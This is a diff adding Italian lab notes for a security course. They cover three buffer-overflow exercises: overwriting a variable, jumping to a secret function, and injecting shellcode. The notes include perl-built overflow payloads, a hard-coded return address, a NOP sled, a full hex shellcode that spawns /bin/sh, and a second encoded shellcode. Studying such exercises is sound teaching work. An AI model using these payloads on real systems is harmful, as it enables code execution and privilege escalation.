@@ -643,3 +643,95 @@
   john es_zip.txt
   ```
 - Scopriamo che la password è `batman`
+
+== Brute forcing e buffer overflow
+
+=== Write var
+Consegnare un file report.pdf che contenga:
+
+- Payload e screenshot che dimostra la capacità di sovrascrivere la variabile
+- Payload e screenshot dell'exploit finale lanciato
+- Spiegazione dettagliata di come si è proceduto ad analizzare ed exploitare la vulnerabilità
+
+Payload in `gdb`:
+#cfigure("images/2024-04-08-11-33-51.png",100%)
+
+#pagebreak()
+
+Payload dato come argomento all'eseguibile:
+#cfigure("images/2024-04-08-11-34-32.png",100%)
+
+- Per poter riscrivere la variabile bisogna capire prima la lunghezza minima della stringa da dare come argomento tale per cui il programma da segmentation fault
+- Quindi si inizia magari con una stringa di 100 "A", e poi a step di 10, 100 caratteri in più finché il programma non ci da segmentation fault
+- Nel mio caso sono arrivato a dare una stringa di 2000 caratteri per scatenare il problema, e poi piano piano ho diminuito la lunghezza
+- Ci viene in aiuto anche la stringa di debug che ci dice il valore della variabile `control`
+- Infatti, dando come argomento una stringa lunga 1324 caratteri, vediamo che il valore di `control` è cambiato: se prima, con stringhe più corte, valeva `3039`, adesso con una stringa di 1324 caratteri ha valore `3030`; questo è il segnale che la sequenza di caratteri inserita dopo la sequenza di 1324 "A" verrà sovrascritta nella variabile `control`
+- A questo punto dobbiamo costruire la sequenza di caratteri esadecimali con cui sovrascrivere la variabile, ricordando che il formato usato è little endian
+
+== Secret function
+Consegnare un file report.pdf che contenga:
+
+- Payload e screenshot che dimostra la capacità di sovrascrivere l'indirizzo di ritorno
+- Payload e screenshot dell'exploit finale lanciato
+- Spiegazione dettagliata di come si è proceduto ad analizzare ed exploitare la vulnerabilità
+
+Screenshot di gdb:
+#cfigure("images/2024-04-08-12-27-49.png",100%)
+
+- Come prima proviamo a scatenare un segmentation fault
+- Dopo pochi tentativi vediamo che per fare ciò basta dare come argomento al programma una stringa di 16 caratteri
+- Per controllare che ciò che viene scritto dopo questa sequenza sovrascriva l'indirizzo di ritorno aggiungiamo alle 16 "A" la stringa "BBBB"; si nota che ora l'indirizzo di ritorno è `0x42424242`, come ci si aspettava
+- Con 
+  ```bash
+  (gdb) info function
+  ```
+  vediamo che ci sono diverse funzioni segrete
+  #cfigure("images/2024-04-08-12-34-34.png",80%)
+- Per `secret_function_rreal`
+  ```bash
+  run $(perl -e 'print "A"x16,"\xc9\x61\x55\x56"')
+  ```
+
+== Shellcode
+Eseguire l'esercizio in due modi:
+- usando lo stesso shellcode utilizzato durante l'esercitazione in laboratorio
+- usando lo shellcode 
+  ```
+  \xbf\x16\x6e\x8a\x7c\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0c
+  \x31\x7a\x12\x03\x7a\x12\x83\xd4\x6a\x68\x89\xb2\x79\x34\xeb\x10
+  \x18\xac\x26\xf7\x6d\xcb\x51\xd8\x1e\x7c\xa2\x4e\xce\x1e\xcb\xe0
+  \x99\x3c\x59\x14\x90\xc2\x5e\xe4\xd6\xac\x3f\x89\x7d\x11\xed\x30
+  \x7e\x06\xbe\x3b\x9f\x65\xc0
+  ```
+
+consegnare un file report.pdf che contenga:
+- Payload e screenshot che dimostra la capacità di sovrascrivere l'indirizzo di ritorno
+- Payload e screenshot dell'exploit finale lanciato
+- Spiegazione dettagliata di come si è proceduto ad analizzare ed exploitare la vulnerabilità
+
+
+- Con il comando
+  ```bash
+  (gdb) run $(perl -e 'print "A"x1512,"BBBB"')
+  ```
+  riusciamo a sovrascrivere la stringa `0x42424242` come indirizzo di ritorno
+- Siccome la lunghezza del nostro shellcode è 46, e il buffer è di 112, riempiamo il payload di 1466 caratteri NOP `\x90` all'inizio
+- Ora devo controllare l'indirizzo di memoria in cui finisce la sequenza di caratteri NOP e dove inizierebbe lo shellcode 
+- Dando il comando
+  ```bash
+  run $(perl -e 'print "\x90"x1512,"BBBB"')
+  ```
+  e controllando cosa viene salvato negli indirizzi di memoria con il comando
+  ```bash
+  (gdb) x/800xw $esp
+  ```
+  si vede che la sequenza di NOP termina all'indirizzo `0xffffd260`
+- Quindi ora si da il comando
+  ```bash
+  (gdb) run $(perl -e 'print "\x90"x1466,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16
+  \x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08
+  \x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+  ,"\x60\xd2\xff\xff"')
+  ```
+
+== 
